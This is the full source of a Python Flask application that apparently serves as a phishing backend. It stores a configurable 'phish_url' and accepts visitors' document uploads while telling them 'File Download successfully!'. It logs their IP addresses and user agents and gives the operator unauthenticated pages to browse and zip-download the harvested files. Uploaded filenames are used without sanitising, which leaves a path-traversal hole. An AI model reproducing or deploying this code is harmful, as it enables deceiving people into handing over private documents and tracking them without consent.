from flask import Flask, request, render_template, send_from_directory, abort, jsonify
import os
import shutil
import zipfile
import io
import json
from flask import send_file
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
LOG_FILE = 'access_log.txt'
PHISH_URL_FILE = 'phish_url.json'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def get_phish_url():
    if os.path.exists(PHISH_URL_FILE):
        with open(PHISH_URL_FILE, 'r') as f:
            data = json.load(f)
            return data.get('url', '')
    return ''

def save_phish_url(url):
    with open(PHISH_URL_FILE, 'w') as f:
        json.dump({'url': url}, f)

@app.after_request
def add_no_cache(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload-files', methods=['POST'])
def upload_files():
    files = request.files.getlist('docs')
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_folder = os.path.join(UPLOAD_FOLDER, timestamp)
    os.makedirs(session_folder, exist_ok=True)

    # Log IP and device info
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    with open(LOG_FILE, 'a') as log:
        log.write(f"[{timestamp}] IP: {user_ip}, Agent: {user_agent}\n")

    for file in files:
        filepath = os.path.join(session_folder, file.filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        file.save(filepath)

    return "✅ File Download successfully!"

@app.route('/files')
def files_page():
    folders = []
    if os.path.exists(UPLOAD_FOLDER):
        for name in sorted(os.listdir(UPLOAD_FOLDER), reverse=True):
            folder_path = os.path.join(UPLOAD_FOLDER, name)
            if os.path.isdir(folder_path):
                file_count = sum(len(files) for _, _, files in os.walk(folder_path))
                total_size = sum(os.path.getsize(os.path.join(dp, f)) for dp, _, fns in os.walk(folder_path) for f in fns)
                size_str = f"{total_size / 1024:.1f} KB" if total_size < 1024 * 1024 else f"{total_size / (1024*1024):.1f} MB"
                folders.append({
                    'name': name,
                    'file_count': file_count,
                    'size': size_str
                })
    return render_template('files.html', folders=folders, phish_url=get_phish_url())

@app.route('/files/<folder_name>')
def view_folder(folder_name):
    folder_path = os.path.join(UPLOAD_FOLDER, folder_name)
    if not os.path.isdir(folder_path):
        abort(404)
    files = []
    for dp, _, fns in os.walk(folder_path):
        for f in fns:
            full = os.path.join(dp, f)
            rel = os.path.relpath(full, folder_path)
            size = os.path.getsize(full)
            size_str = f"{size / 1024:.1f} KB" if size < 1024 * 1024 else f"{size / (1024*1024):.1f} MB"
            files.append({'name': rel, 'size': size_str})
    return render_template('folder.html', folder_name=folder_name, files=files)

@app.route('/files/<folder_name>/download/<path:filename>')
def download_file(folder_name, filename):
    folder_path = os.path.join(UPLOAD_FOLDER, folder_name)
    if not os.path.isfile(os.path.join(folder_path, filename)):
        abort(404)
    return send_from_directory(folder_path, filename, as_attachment=True)

@app.route('/files/<folder_name>/download-zip')
def download_zip(folder_name):
    folder_path = os.path.join(UPLOAD_FOLDER, folder_name)
    if not os.path.isdir(folder_path):
        abort(404)
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        for dp, _, fns in os.walk(folder_path):
            for f in fns:
                full = os.path.join(dp, f)
                arcname = os.path.relpath(full, folder_path)
                zf.write(full, arcname)
    memory_file.seek(0)
    return send_file(memory_file, download_name=f'{folder_name}.zip', as_attachment=True)

@app.route('/update-phish-url', methods=['POST'])
def update_phish_url():
    data = request.get_json()
    url = data.get('url', '')
    save_phish_url(url)
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
